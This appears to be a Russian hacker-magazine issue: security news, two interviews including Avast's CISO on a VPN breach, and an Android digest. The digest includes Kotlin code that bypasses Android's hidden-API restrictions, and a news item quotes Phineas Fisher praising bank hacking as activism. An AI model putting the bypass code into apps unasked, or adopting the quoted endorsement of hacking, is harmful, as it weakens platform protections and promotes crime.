 ФИШЕР ПРЕД ЛАГАЕТ НАГРАЖДАТЬ ХАКЕРОВ ЗА ПОЛИТИ‐
  ЧЕСКИЕ АТАКИ
  Многолетнее молчание прервал известный хактивист Фине ас Фишер (Phineas Fisher), который
   в 2016 году слил WikiLeaks документы правящей партии Турции и скомпрометировал профес‐
   сиональных разработчиков и пос тавщиков шпионского ПО — компании FinFisher и Hacking
   Team.
       Его новый манифест предлагает подогревать интерес к хактивизму, поощряя его финан‐
   сово, — вознаграждать хакеров за политичес кие атаки во имя общес твен ных инте ресов. Свою
   программу он назвал Hacktivist Bug Hunting Program и сообщил, что готов заплатить другим
   активистам до 100 тысяч долларов в крип товалюте (Bitcoin или Monero).
     В качестве примеров Фишер перечис лил возможные цели для хактивис тов: горнодобы‐
   вающие и животноводческие компании в Южной Америке, израильский разработчик спайвари
  NSO Group и нефтяная компания Halliburton.





  →«Я считаю, что хакерство — это мощный инструмент, и хактивизм использует только часть
   своего истинного потенциала. Небольшие инвестиции могут помочь ему раз виваться, лучшие
   времена [хактивизма] еще впереди.
      Взлом с целью получить и слить документы, представляющие общественный интерес, —
   один из лучших способов использовать хакерские способности на благо общес тва. Я не пыта‐
   юсь никого озолотить, я лишь пытаюсь выделить дос таточно средств, чтобы хакеры могли дос‐
   тойно зарабатывать на жизнь, делая хорошую работу.
     В цифровую эпоху ограбление банка является ненасильствен ным актом, наименее рис‐
   кованным, а вознаграждение выше, чем где‐либо еще. Мировая финан совая элита — это угне‐
   татели, а не жертвы. <...> Взлом этой элиты и воз вращение крошечной доли похищенного ими
   богатства не делает их жертвами. Это кибер прес тупление. А также это активизм, мотивирован‐
   ный стремлением к соци альным переменам. Я не получаю от этого никакой выгоды и прибыли»
  — заявляет Финеас Фишер





 ПРОБЛЕМА TPM‐FAIL
  Сводная группа иссле дова телей из Вус терского политехнического института
  (США), Университета Любека (Германия) и Калифорнийского уни верситета
   в Сан‐Диего (США) раскрыла детали двух проб лем, получивших общее наз‐
  вание TPM‐FAIL. Баги связаны с Trusted Platform Module (TPM) и позволяют
  извлекать криптографические клю чи, хранящиеся в TPM.
     Опасность TPM‐FAIL обус ловлена тем, что, по завере ниям исследова‐
   телей, такие атаки могут успешно применять ся в реальной жизни — для TPM‐
   атак в целом это редкость. Так как на сегодняшний день сложно найти
  устройство, которое не использует TPM в виде аппаратно изолированного
  чипа или программного решения, перед проблемой потенциально уяз вимы
  миллиарды устрой ств, начиная от ПК, ноутбуков и серверов и заканчивая IoT.
     TPM‐FAIL состоит из двух уяз вимостей:
   • первая (CVE-2019-11090) связана с технологи ей Intel Platform Trust
      (PTT). Intel PTT — это программное TPM‐решение для Intel fTPM, которое
     широко применяется на серверах, нас тольных компьютерах и ноутбуках.
     Его поддерживают все процессоры Intel, выпущенные с 2013 года, то есть
     начиная с поколе ния Haswell;
   • вто рая (CVE-2019-16863) связана с чипами ST33 TPM производс тва
     компании STMicroelectronics. ST33 TPM весьма популярен и используется
     в составе самых разных устройств, от сетевого оборудования до облачных
     серверов. Это один из немногих чипов, которые получили клас сификацию
     CommonCriteria (CC) EAL 4+, то есть поставляется со встроенной защитой
     против side‐channel‐атак.

  Стоит сказать, что специалисты изу чали и дру гие TPM‐решения, в том чис ле
   от Inﬁneon и Nuvoton, но те были признаны надежными.
    По сути атаки TPM‐FAIL представляют собой проблему timing leakage, то
   есть потенциальный злоумышленник может следить за тем, как TPM выпол‐
   няет повторяющиеся операции, и отмечать разницу во времени. Анализируя
   эти данные и основываясь на том, какое количес тво времени TPM тратит
  на одни и те же операции, ата кующий получает возможность извлечь
  информацию, обрабатываемую внутри TPM.





  По информации исследова телей, с помощью ата ки можно извлечь 256‐бит‐
  ные приватные ключи, хранящиеся в TPM. Такие 256‐битные ключи исполь‐
  зуются определен ными схемами цифровой подписи, работающими на осно‐
  ве алгоритмов эллиптических кривых, например ECDSA и ECSchnorr. В итоге
  под угрозой оказываются такие криптографически защищенные опе рации,
   как установление TLS‐соединений, подписыва ние циф ровых сертификатов
  и авторизация входов в систему.





  Отдельно подчеркивается, что ата ки TPM‐FAIL занимают не слишком много
  времени. Так, чтобы вос становить ключ ECDSA из Intel fTPM, понадобится
   от четырех до двадцати минут, в зависимости от уровня доступа. Исследова‐
   тели утверждают, что ата ки можно выполнять и удаленно в быс трых сетях.
  К примеру, восстановление ключа аутентифика ции VPN‐сервера заняло
   у специалистов около пяти часов и потребова ло ини циирования поряд‐
   ка 45 тысяч аутентифика ционных handshake’ов и внимательного изучения
  ответов сервера.
     Представите ли   Intel  уже  опубликова ли офи циальные  рекомендации
  по безопасности и выпус тили обновления для Intel PTT. Разработчики STMi‐
   croelectronics, в свою очередь, не смогли прос то выпус тить обновле ние ПО и
  вместо этого подготовили новую версию чипа ST33, который, как уже под‐
  твердили исследователи, устойчив перед ата ками TPM‐FAIL.


 41% РОССИЯН ДЕЛЯТСЯ В СЕТИ ИНТИМНЫМИ ФОТО


   Эксперты ESET опубликовали исследование, делятся ли рос сийские пользователи интимными
   фото и видео. Согласно результатам, 41% опрошен ных обмениваются подобным контентом.

   Похожее исследование специалисты ESET уже про водили в 2015 году. Тогда в пристрас тии
   к обмену откровенным контентом признались 53% респонден тов.

   Судя по всему, за минувшие годы пользователи стали больше беспоко иться о сохраннос ти
   приватных данных. Так, в рам ках нового исследования выяс нилось, что 8% опро шенных лично
   сталкивались с утечкой своих приватных фотог рафий. Еще 43% сооб щили, что не делятся
   такими материалами с кем‐либо.

   Респондентам также был задан вопрос о способах защиты личных дан ных. 45% не хранят при‐
   ватную информацию, 16% защищаются с помощью антивируса, а 11% при бегают к прод‐
   винутым методам (VPN и шифрованию).

   Остальные 33% опрошенных сообщили, что не заботятся о собс твенной безопасности в Сети,
   поскольку им нечего скрывать.





 INTEL УДАЛЯЕТ
 СТАРЫЙ BIOS
  Пользователи форумов Vogons обнаружили, что компания Intel собирается
  удалить с официального сайта ста рые драйверы и обновления BIOS. К при‐
   меру, на странице BIOS Update [SOX5810J.86A] 5600 было пре дупреждение
  о скором конце срока службы, и пос ле 22 ноября 2019 года страница стала
  недоступна, то есть обновление недос тупно для загрузки и не будет под‐
  держиваться ни в каких формах. Пользователям BIOS Update [SOX5810J.86A]
  5600 рекомендовали как можно скорее прекратить использовать данный
  продукт.
     Аналогичные сооб щения можно было встретить на страницах множества
  драйверов и обновле ний BIOS для системных плат и настольных ПК Intel,
  выпущенных компанией в 1990‐х и в начале 2000‐х годов. Большинство драй‐
  веров предназначены для ста рых версий Windows, таких как 98, ME, XP и Win‐
  dows Server, чей срок служ бы мно го лет назад тоже подошел к концу. Фак‐
   тически Intel давно прекратила выпус кать обновления и для своего старого
   железа, и старые файлы размещались на сайте производителя просто
  для удобства.
    В итоге Intel подверглась резкой критике со сто роны сооб щес тва, ведь
  многие до сих пор используют уста ревшие сис темы и устаревшее оборудо‐
  вание Intel. Так, некоторые пользователи заметили эту тре вожную тенденцию
  еще в сентябре текуще го года. К примеру, программист, известный под псев‐
  донимом Foone Turing, еще тогда писал в Twitter, что производители просто
  обязаны поддерживать свое железо, держать драйверы и прошивки на сайтах
  до победного конца, «пока солнце не взорвется» или компания не обанкро‐
   тится.
     Теперь, когда дело получило широкую огласку, пользователи сетуют, что
  компании намеренно избавляются от старого ПО, пытаясь вынудить клиентов
   покупать новое оборудование, так как использовать старое становится поп‐
   росту невозможно.
     Нужно заметить,  Intel не единственная компания, которая практику ет
  подобное. К примеру, в 2017 году похожий ход с удалением ПО для старых
  продуктов с сайта предприняла компания HP. Но в то же время такие про‐
  изводители, как Dell и Lenovo, напротив, предоставляют своим пользовате‐
  лям пол ный набор старых драйверов для любых решений.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

  В даркнете появился новый поисковик Kilos


   Сторонние SDK тайно собирали дан ные пользователей Twitter и Facebook


   Опенсорсный LibreTorrent удален из Google Play якобы из‐за наруше ния правил платформы


   На одном сервере ElasticSearch обнаружили дан ные 1,2 мил лиарда пользовате лей


   Китайские эксперты рассказали о кибератаках на казахстанские компании и организации


    Twitter наконец позволит пользователям не применять SMS для двухфакторной аутентификации


   Google готова заплатить до 1,5 миллиона долларов за ком про метацию Titan M


   Американского студента обвинили в разработке кас томного дис трибутива Gentoo для ИГИЛ


   Google и Samsung исправили баг, позволявший приложениям следить за пользователями через
   камеру


   Американские власти предупредили об опас ности публичных зарядных стан ций, использующих
  USB
HEADER





БЛИЦ-ИНТЕРВЬЮ
АЛЕКСЕЙ
ЛУКАЦКИЙ
О ПОСТРОЕНИИ ЗАЩИТЫ,
«ГИДРЕ» И ФОРМУЛЕ ВЗЛОМА




Алексей Лукацкий — именитый  эксперт
в области ИБ, а также вла делец самой
узнаваемой шляпы в российском инфо‐
сек‐сообществе. Не исключено, что ты уже
бывал на его выс туплениях. Мы же задали            rusecmedia                                                                                   Весь материал является
ему  несколько  важных,  про вокационных        совпаденияшуточным.с реальнымиЛюбые
и не сов сем серьезных вопросов в продол‐         компаниямислучайны.и людьми
жение нашей серии коротких интервью.


             INFO

                  Материал подготовлен ведущими канала @rusec‐
                       media эксклюзивно для «Хакера».


— Насущный вопрос: если работу обезьяны‑пен тесте ра мож но
уже давно авто матизиро вать и нуж ды в этих спе циалистах нет,
когда мы смо жем заменить экспертов, которые занимаются нор-
мативными докумен тами, ФЗ и про цессами в области ИБ?
— Если бы работа законодателей была предсказуемой и формализованной,
то, действительно, их можно было бы заменить роботами, штампующими
новые нормативные акты. Но, увы, в отличие от обезьяны, обладающей хоть
малым, но все‐таки интеллектом, у законодателей час то нет даже небольшой
искры сознания, поэтому никакой искусственный интеллект заменить их
не может. Так что работа бумажных безопас ников, трактующих результаты
деятельности депутатов, будет нужна всег да. И чем дальше, тем больше.


— Формула взло ма любой компании?
— Если верить Плутарху, то еще Юлий Цезарь в 47 году до нашей эры при‐
думал эту формулу, и она звучит так: «Пришел. Уви дел. И взломал!»


— IDA Pro, Radare2 или Ghidra?
— Конечно же, «Гидра». Она не только разработана моими друзьями из АНБ,
которым можно доверять, но и бесплатна в отличие от той же «Иды».


— Биз нес ИБ постро ен на том, что бы про дать страх дру гим ком-
паниям (например, мож но вспомнить MaxPatrol ). Плюс кло -
уны‑иссле дователи находят настолько слож ные уяз вимости, что
в реальности обыч ному блек хету найти не в силах. Как понять,
что вашей компании пора задуматься о ИБ?
— Если вам написал человек по имени Ашот или позвонила журналис тка
по имени Вероника или Маша, то компании непременно стоит задуматься
о ИБ. Это стопроцен тные индикаторы!


— Скажите, что делать людям, которых шан тажиру ют утек шими
персональными дан ными какие‑нибудь зло умыш ленники, нап-
ример с име нем Огот Ашо тесян?
— Я бы задумался о смене паспорта, ника в соцсети, номера мобильного,
адреса проживания, а также обра тился бы к пластическому хирургу для сме‐
ны лица и голосовых свя зок (может быть, и пол поменял, на вся кий случай).
Потому что прайвеси — это такая тема, с которой лучше не шутить! А то
еще будут названивать непонятные люди из службы безопас ности Опер‐
банка...


— Любимая уяз вимость?
— Memory leak. Ее преимущество в том, что про нее быстро забываешь
и можно не устранять.


— Про дол жите анек дот: «Заходят в бар три спе циалиста по ИБ...»
— ...


— Пять прак тических советов спе циалистам по информацион ной
безопасности.
— Любой специалист по ИБ должен помнить про пять важней ших в его
деятельности измерений:  1. Длина важнее  всего,  когда мы говорим
о паролях. 2. Глубина важнее всего, когда мы говорим об эшелони рованной
защите. 3. Ширина важнее, когда перед нами сто ит выбор защитных и ком‐
пенсирующих мер. 4. Скорость важнее, когда мы занимаемся реальной
безопасностью, а не бумагомаратель ством. 5. Деньги важнее все го, так
как именно это измерение лучше вос принимается людьми, которые платят
деньги специалистам по ИБ за их работу.


        WWW

                       Блог Алексея Лукацкого
HEADER





Андрей Письменный
  Главный редактор
apismenny@gmail.com

APT
В AVAST

CISO AVAST ДЖАЙЛА БАЛУ
ОБ АТАКЕ НА КОМПАНИЮ
И О СЛОЖНОСТЯХ ХОРОШЕЙ
БЕЗОПАСНОСТИ




Джайла Балу еще не успела заступить на пост CISO ком‐
пании Avast, оставив аналогичную должность в телеком‐опе‐
раторе KPN, как ей пришлось устранять последствия серь‐
езного  инцидента. Злоумышленники  смог ли проник нуть
 внутрь периметра, похитив аккаунт VPN. Мы расспросили
Джайлу Балу о том, через что прошли сотрудни ки после ата‐
 ки, и о том, как живется CISO в антивирусной компании.

           ИНЦИДЕНТ

— Расскажите, как выглядело про исшествие с вашей точ ки зре -
 ния.
— Я пришла в компанию 1 октября 2019 года. А в последнюю неделю сен‐
 тября, когда я была еще в KPN, мне поз вонили из Avast и сказали, что наб‐
 людают нечто странное. Я, конечно, переспро сила, насколько странное.
В нашем деле всегда про исходит что‐нибудь странное, особенно когда смот‐
 ришь логи, приходящие отовсюду. Мне ответили, что это очень похоже на ата‐
 ку.
  Мы немедленно позвонили внешнему подрядчи ку, который занимается
 форензикой, чтобы отправить ему находки и чтобы он немедленно занялся их
 изучением. Потом мы сами подняли логи, пытаясь понять, что все же про‐
 изошло. И нашли там вещи, на которые изначально не обратили внимания.
   Чтобы получить наиболее богатую информа цию, нужно смотреть даш‐
 борды по каждому отдельному устройству вмес то объ единенных логов в sys‐
 log и прочих местах. Это, конечно, очень кро потливая работа и в целом неэф‐
 фективный способ, которо го я надеюсь избегать в будущем. Но зато мы
 обнаружили расхождения в логах от Microsoft Analytics, от VPN, от файрволов
 и других служб, которые у нас работают.
  И самое неприятное в такой ситуации — это то, что ты не знаешь, какому
 из них верить. Например, ты видишь что‐то необычное, сверяешь с дру гим
 логом, решаешь, что это какое‐то лож ное сра баты вание, и идешь дальше.
 А именно эта зацепка и могла привести тебя к истине.
   Это как находиться в каком‐то футуристичес ком лесу из «Голодных игр»,
 видеть четыре пути и не знать, по какому нужно идти, чтобы чего‐то дос тичь
 и не умереть по дороге. Вна чале, например, мы выб рали неверно.


— Раз ве SIEM не дол жны срабаты вать имен но в таких слу чаях?
— Очевидно, недостаточно хорошо, и я планирую заменить наш. Но мы дол‐
 жны были заметить ошиб ку раньше и найти корреляцию. Зато, когда мы уже
 разбирали последствия, изолировав сеть, картина постепенно начала скла‐
 дываться.
   Атакующий смог проникнуть внутрь периметра через VPN. Причем про‐
 филя, которым он пользовался, не дол жно было существовать: какое‐то вре‐
 мя назад его создали для выгрузки бэкапов и должны были деактивировать.
 Но этого не сделали — ско рее всего, по ошиб ке, а не с прицелом на атаку.
   Тем не менее логин и пароль, которые требовались для входа, оказались
 похищены. Двух фактор ной аутентификации там не было, хотя во всех других
 местах у нас используется 2FA.


— Вы отсле дили, кто и как пользовал ся этим соединением?
— Мы нашли пользователя, чьи учетные данные были скомпрометированы
 и использовались для логина в VPN. Сначала у атакующе го были лишь очень
 невысокие пользовательские привилегии, но  затем, применив  Mimikatz
 или pass the hash (технику атаки на Kerberos), нарушители получили права
 админа домена. Мы видели запросы на репликацию на контроллере домена.
 Именно это действие и спровоцировало алерт от ATA (Advanced Threat Analyt‐
 ics), который привлек наше внимание. К сожалению, мы отмели его как лож‐
 ноположительное срабатывание.
   Когда мы вернулись к это му пути и изу чили все таймстемпы, мы смогли
 проследить весь ход атаки. В логах Checkpoint было отчетливо видно, куда им
 удалось, а куда не уда лось пробрать ся. До «бриллиантов короны» они
 не дошли. Но как можно быть уверенным на все сто процентов? Никак! Имен‐
 но поэтому мы перешли на осадный режим, выключили всё, что могли, и стали
 всё перепроверять.
  И именно поэтому меня тут теперь так «любят». Но мне нужно было исхо‐
 дить из наихудшего сценария. Потому что вто рого шанса исправить софт,
 который может быть подписан скомпромети рованным сертификатом, уже
 не будет. Поэтому мы отследили ата ку от началь ной точки (это было 14–
 15 мая 2019 года), когда был первый логин через этот VPN, и решили
 не доверять ничему, что было после этого.
   Если права этого конкретного пользователя удалось под нять до админа
 контроллера домена, то, получается, нельзя верить вообще ничему. Так что
 все, что мы выпускали за последние полгода, пришлось проверять. Каждый
 релиз каждого нашего продукта — на все воз можные способы инжекта. И не
 один раз, а два. В общем, еще один повод любить безопасников!

      БРИЛЛИАНТЫ КОРОНЫ

— Дан ные, исходники и популярные про дук ты, которы ми владеет
 антивирусная компания, — это, наверное, лакомый кусочек
 для мно гих. Причем, я думаю, не только для преступников, но и
 для спецслужб…
— Именно поэтому в самом начале инцидента мы обратились к своим кол‐
 легам, в том числе к конкуриру ющим антивирусным компаниям. Мы хотели
 передать им информацию, которая помогла бы защититься от повторения
 этой истории. На мой взгляд, это очень важно и в индустрии антивирусов про‐
 исходит недостаточно часто. Тот же телеком выживает только потому, что все
 операторы сталкиваются с одними и теми же угрозами. Когда я была в KPN, я,
 например застала атаку на Belgacom.
   Вкратце вот что тогда случилось. У ЦРУ и бри танского GCHQ была цель
 на Среднем Востоке — кто‐то, кого они идентифици ровали благодаря спут‐
 никовому телефону и определили, что он находится в Саудовской Аравии.
 Добраться до этой цели ока залось слож но — с безопасностью там все
 в порядке. Поэтому для них было ценно хотя бы перехватить данные.
   Спецслужбы в итоге взло мали оператора, который предоставлял связь
 этой цели. Если бы они попытались получить ордер и заставить оператора
 сотрудничать, он бы узнал об их действиях, что было нежелательно. Вмес то
 этого была создана специальная малварь — Regin. Ее использовали для ата‐
 ки на Belgacom и через нее получили доступ к данным цели. В процессе было
 использовано четыре зиродея и глу бокие зна ния оборудования канального
 уровня — в том числе команды, которые обычно есть только у его раз работ‐
 чиков. В общем, серьезнейшая атака.
   К чему я об этом расска зываю: мы‐то всегда думали, что работаем с этими
 агентствами официально и они вряд ли будут выступать как противники. Есть
 ведь нормальные пути получения информа ции — без вся ких взломов.
  И тут надо понимать, что операторы по всему миру используют одно и то
 же оборудование — Ericsson, Nokia и так далее. И возможность атаки
 на одного из них (особенно с использованием недокументированных фун‐
 кций оборудования) озна чает, что сработает и на большинс тве остальных.
 Именно поэтому мы активно работа ли с Belgacom, чтобы каждый мог обе‐
 зопасить себя. И именно поэтому я хотела бы, чтобы в индустрии анти виру‐
 сов все так же спешили общать ся между собой и кооперировались против
 плохих ребят.

      НЕПРОСТАЯ ЖИЗНЬ CISO

— Вы отве чаете за безопасность в компании, которая занимается
 безопасностью. Насколько это отличается от работы в любой
 дру гой компании?
— Я думала, что это будет легче, поскольку все и так хорошо знакомы с пред‐
 метом, но в реальности ока залось нам ного сложнее! Во‐первых, все думают,
 что всё знают лучше тебя. Во‐вторых, в компании, которая занимается
 безопасностью, самое важ ное — это даже не продукт, а люди, которые
 работают над ним. Именно программисты — нас тоящий «дви жок» продукта.
И у них должна быть возможность работать с комфортом.
   В KPN и в других ком паниях, где я выполняла функции CISO, главной
 задачей было следить за тем, чтобы дыры в старом соф те не привели к ком‐
 прометации. Многие  вещи  были  нас только  старыми,  что  уже  даже
 не обновлялись, а выбросить их было нельзя. Здесь же проблема — это не
 легаси, а, наоборот, новые вещи, которые нужно внедрять очень быстро, что‐
 бы поспевать за рынком. Настолько быстро, что выстроить ту же сис тему
 сдержек и противовесов, как в любой дру гой компании, просто не получа‐
 ется. Здесь все хотят, чтобы все было внедрено немедленно, а еще лучше —
 вчера.
   Если ты, действуя как безопасник, начнешь задерживать циклы разработки
 и релизов, ничего хорошего в ответ не услышишь. Никто не будет это терпеть.
 Но так получилось, что в первые же недели, как я пришла в компанию, я сде‐
 лала именно это. Сказала: «Больше никаких релизов, пока мы все не про‐
 верим, ничто не покинет двери компании — ни новые релизы, ни старые.
И никаких хотфиксов».


— Теперь вы в глазах людей Мордак из комик сов про Дил берта?
— Точно!


— Но, мне кажется, люди все же дол жны понимать тре бования.
— Конечно‐конечно. Но, например, в случае с ата кой, о которой мы говорили,
мы не могли им ничего рас ска зывать, пока шло рас следование. При этом мы
 объявили, что нужно остановить подготовку любых билдов, даже ежедневные
 обновления. Апдейты сигнатурной базы обязаны выходить в срок, но мы
 попытались задержать даже их, чтобы все перепроверить. Пришлось при‐
 думывать хитроумные методы проверки, но в ито ге мы все же обновили базу.
 Потом мы проверили все версии CCleaner, все версии антивируса и все
 остальные продукты. Вот этим мы и занимались половину октября, работая
 по 18 часов в день.

      ЗДОРОВАЯ ПАРАНОЙЯ

— Если отвлечься от инциден та, насколько в целом тяжело зас-
 тавлять людей здесь сле довать правилам?
— Очень тяжело! Потому что они все умные люди и думают: «Правила? Какие
 правила?!» Но главная проблема тут все же не в этом. Если мы хотим
 хорошую безопасность, то она должна быть естественной, не должно быть
 никаких барьеров и ее обеспечение должно быть частью того, что человек бы
 хотел делать, а не лишним шагом на пути.
  И этого очень сложно добиться в раз работке софта, где каждый знает,
 как обойти тот или иной шаг, и привык к тому, что все когда‐то было легко
 доступно всем. Сложно приучить людей, например, к тому, что не нужно
 запускать хакерские утилиты в той же сети, в которой есть что‐то важное. Я
 могу предоставить «грязное» окружение, где можно будет делать что угодно,
 но тогда в «чистом» можно будет только читать почту и заниматься прочими
 безобидными делами.


— У вас, наверное, есть и машины, не под ключен ные вооб ще ни к
 каким сетям? Air gap и все такое…
— Есть. И все равно на них пытаются что‐нибудь пронес ти. Здесь пол но
 умных и хорошо мотивированных инженеров, которые привыкли к онлайну и к
 полной свободе. Так что, если пытать ся что‐то отнять, можно столкнуться
 с бунтами. Часть игры —  находить спо собы повышать безопасность,
 не лишая людей важных для работы вещей.
   В общем‐то, у компании может быть лучшая безопасность в мире, но это
 не остановит какого‐нибудь случайного сотрудника от того, чтобы забыть
 в столовой или в машине свой открытый ноутбук.


— Мож но ли сказать, что народ здесь раз деляет вашу паранойю?
— Нет! Я не думаю, что кто‐нибудь здесь вооб ще такой же параноик, как и я.
 Вот, например, эти бейджи, которыми мы открываем две ри. Я знаю, что их
 можно клонировать! Ух… Дышать ровно, дышать ровно… (выдыхает). Ничего,
 я это тоже починю. У меня, кста ти, даже футболка есть с надписью «Профес‐
 сиональный параноик». Ну и вообще, это то, за что мне платят. В конце кон‐
 цов, здоровая паранойя — это просто человеческий инстинкт выживания.
   А вот нездоровой она становится, если что‐то, что ты защищаешь, нет
 смысла защищать. Например, если единс твенный способ защитить онлай‐
 новый сервис — это отключить от всего и закопать в бункере на глубине
 десяти метров, это вряд ли будет иметь какой‐то смысл. То есть безопас‐
 ность не должна мешать двигать ся вперед, а это в нашей работе, к сожале‐
 нию, иногда случается.
HEADER
ANDROID





     ДОСТУП К СКРЫТЫМ МЕТОДАМ
       И ОБНАРУЖЕНИЕ ROOT




Сегодня в выпус ке: обход защиты на доступ
к скрытым методам, обна ружение прав root
в  обход  Magisk  Hide,  рассказ  о  том,
как Google вычис ляет зловредные приложе‐
ния в Google Play, разрушение мифов о тех‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
никах  оптимизации  про изводительности              zobnin@glc.ru
приложений, руководство по защите ком‐
муникационных каналов приложений, при‐
меры использования фун кций‐расширений
в  Kotlin. А также подборка инструментов
пентестера и библиотек разработчика.


                ПОЧИТАТЬ


Как обойти защиту на доступ к скры тым методам
Developers: It’s super easy to bypass Android’s hidden API restrictions — деталь‐
ный рассказ, как обойти защиту на дос туп к скрытым методам в Android
9 и выше.
   Как и любая другая ОС, Android предос тавля ет разработчикам дос туп
к обширному API, который позволяет вызывать те или иные функции ОС. Этот
API вклю чает в себя ряд скрытых, но иног да очень полезных функций, нап‐
ример возможность развернуть стро ку состояния. Выз вать эти функции нап‐
рямую не получится, так как их просто нет в SDK. Но можно использовать
модифицированный SDK (сложно) или рефлексию (очень просто).
  Рефлексия позволяет дотянуть ся до любых методов и полей клас сов, что,
конечно же, можно использовать для не совсем легальной деятельности.
Поэтому, начиная с Android  9, Google создала черный список методов
и полей, недоступных для вызова с помощью рефлексии. Если приложение
попробует их вызвать, то либо будет при нудительно остановлено, либо
получит предупреждение (в случае с методами из серого списка).
  Но есть в этой защите одна проблема — она основана на проверке име ни
вызывающе го процесса. А это зна чит, что, если мы не будем вызывать метод
напрямую, а попросим саму систему сделать это за нас, проверка даст добро
(не может же она запрещать саму себя).
   Итак, стандартный способ вызова скрытого метода с помощью рефлексии
(не работает, приложение завершается):


val someHiddenClass = Class.forName("android.some.hidden.Class")
val someHiddenMethod = someHiddenClass.getMethod("someHiddenMethod",
String::class.java)


someHiddenMethod.invoke(null, "some important string")

Новый способ вызова скрытого метода с помощью двойной реф лексии
(работает, потому что вызывает метод не наше при ложе ние, а сама сис тема):


val forName = Class::class.java.getMethod("forName", String::class.
java)
val getMethod = Class::class.java.getMethod("getMethod", String::
class.java, arrayOf<Class<*>>()::class.java)
val someHiddenClass = forName.invoke(null, "android.some.hidden.
Class") as Class<*>
val someHiddenMethod = getMethod.invoke(someHiddenClass, "someHi
ddenMethod", String::class.java)


someHiddenMethod.invoke(null, "some important string")

Но и это еще не все: с помощью этого трюка мы можем вызывать очень инте‐
ресный скрытый метод setHiddenApiExemptions, который позволяет (бам!)
добавить нужные нам методы в исключения и вызывать их с помощью простой
рефлексии.
  Следующий код прикажет системе добавить в исключения вообще все
скрытые методы:


val forName = Class::class.java.getDeclaredMethod("forName", String::
class.java)
val getDeclaredMethod = Class::class.java.getDeclaredMethod("getDec
laredMethod", String::class.java, arrayOf<Class<*>>()::class.java)


val vmRuntimeClass = forName.invoke(null, "dalvik.system.VMRuntime")
as Class<*>
val getRuntime = getDeclaredMethod.invoke(vmRuntimeClass, "getRun
time", null) as Method
val setHiddenApiExemptions = getDeclaredMethod.invoke(vmRuntimeClass,
 "setHiddenApiExemptions", arrayOf(arrayOf<String>()::class.java)) as
 Method


val vmRuntime = getRuntime.invoke(null)


setHiddenApiExemptions.invoke(vmRuntime, arrayOf("L"))

Стоит отметить,  что  Google  в  курсе  этой проб лемы. Они  отклонили
баг‐репорт о возможности вызова скрытых методов под предлогом, что
это защита от дураков, а не security‐фича.


Как обнаружить Magisk
Detecting Magisk Hide — статья о том, как обна ружить присутствие Magisk (и,
как следствие, прав root) на устройстве.
   Magisk — известный, а в пос леднее время единс твенный инстру мент sys‐
temless‐рутинга устрой ств. Он позволяет получить права root без изменения
системного раздела, а также применить различные системные твики. Одна
из широко используемых воз можностей Magisk — функция Magisk Hide,
которая позволяет полностью скрыть сам Magisk и наличие прав  root
на устройстве от выбранных приложений.
  Принцип работы Magisk основан на подключении поверх файловой сис‐
темы системного раздела дру гой файловой сис темы (оверлея), содержащей
бинарный файл su (необходимый для получения прав root) и нужные для его
работы компонен ты. Подклю чение происходит на ранних этапах загрузки, но,
если активирован Magisk Hide, он отключает оверлей для выб ранных при‐
ложений. Другими сло вами, обычные приложения будут видеть содержимое
оверлея, а те, что указаны в настройках Magisk Hide, — нет. С их точки зрения
смартфон будет не рутован.





          Процесс скрытия root можно увидеть в логах Magisk

Но есть в Magisk Hide один изъян. Дело в том, что, если приложение, которое
находится в списке для скрытия root, запустит сервис в изолированном про‐
цессе, Magisk также отклю чит для него оверлей, но в списке подключенных
файловых систем (/proc/<pid>/mounts) этот оверлей останется. Соответс‐
твенно, чтобы обнаружить Magisk, необ ходимо запус тить сервис в изолиро‐
ванном процессе и проверить список подключенных файловых систем.





         Список файловых систем в изолированном процессе

Автор утверждает, что метод работа ет для пос ледней версии Magisk на An‐
droid 8.0–10.0. Proof of concept мож но найти на GitHub.


              ПОСМОТРЕТЬ


Как Google вычисляет зловредные приложе ния
Why Does Google Think My App Is Harmful? — выступление Алека Гертина (Alec
Guertin) на Android Dev Summit’19, посвященное облачному антивиру су
Google Play Protect.
  В своей работе Google Play Protect полага ется на свыше чем 30 тысяч сер‐
веров, которые проводят статический анализ и постоянно запускают в эму‐
ляторах и на реальных устройствах приложения, опубликованные в Google
Play и за его пределами. Система обращает вни мание на следующее поведе‐
ние приложе ний:
 • к каким URL обращается приложение, нет ли их в базе фишинговых URL;
 • какие файлы записывает приложение и нет ли среди них файлов, которые
   не должны перезаписывать ся;
 • не использует ли приложение извес тные методы получения прав root
   (имеются в виду  экс плоиты, а не приложения для уже рутованных
   устройств);
 • не слишком ли это приложение похоже на известное зловредное при‐
   ложение (совпадение в 97%).

Отдельно автор док лада оста новился на том, как рядовому раз работчику
не попасть под подозрение. Google Play Protect может посчитать твое при‐
ложение не вызывающим доверия в следующих случаях:
 • неполное раскрытие информа ции о поведении при ложе ния, например
   уведомить о сбо ре информа ции уже после ее сбора или не оговари вая,
   какие конкретно данные будут отправлены на сервер разработчика;
 • использование сторонних SDK со зловредной функциональностью;
 • альтернативные методы монетизации вроде майнинга крипты, а также
   неразглашение цены или автоматические платежи без согласия;
 • неполное исправление уязвимостей, о которых сообщает консоль раз‐
   работчика;
 • неожиданное поведение приложения, нап ример показ рекламы, которого,
   судя по коду, быть не должно.


Мифы о про изво дительности
Performance Myth Busters — презентация раз работчиков компилятора ART,
используемого в Android для JIT/AOT‐компиляции приложений, о мифах
повышения производительнос ти приложений. Итак, мифы.
 • Код на Kotlin мед леннее и тол ще Java. Эксперимент с конверта‐
   цией приложе ния Google Drive на Kotlin показал, что вре мя запус ка и раз‐
  мер приложения остались прежними, зато объем кодовой базы сократил‐
   ся на 25%.
 • Геттеры замед ляют  код.  Некоторые  разработчики  отказываются
   от использования геттеров в пользу пуб личных полей (foo.bar против
  foo.getBar() ),  надеясь   повысить  производительность.  Однако
   это ничего не дает, потому что компилятор ART умеет инлайнить геттеры,
   превращая их в обычные обращения к полям.
 • Лямбды замед ляют код. Лямбды считаются очень медленными, и ты
  можешь встретить советы заменить их вложенными классами. На самом
   деле после компиляции лямбды превращаются в те же анонимные вло‐
  женные классы.
 • Ал локация объ ектов и сборка мусора в Android — мед ленные.
   Когда‐то это действительно было правдой, но за последние годы раз‐
   работчики сделали алло катор объектов  в  десятки  раз, а сборщик
   мусора — в несколько раз быстрее. Нап ример, на Android 10 автоматичес‐
   кая аллокация объектов в тестах про изво дительнос ти ничем не отличается
   от аллокации и освобождения пула объектов вручную (именно такой спо‐
   соб рекомендовали использовать для сохранения производительности
   ранее).
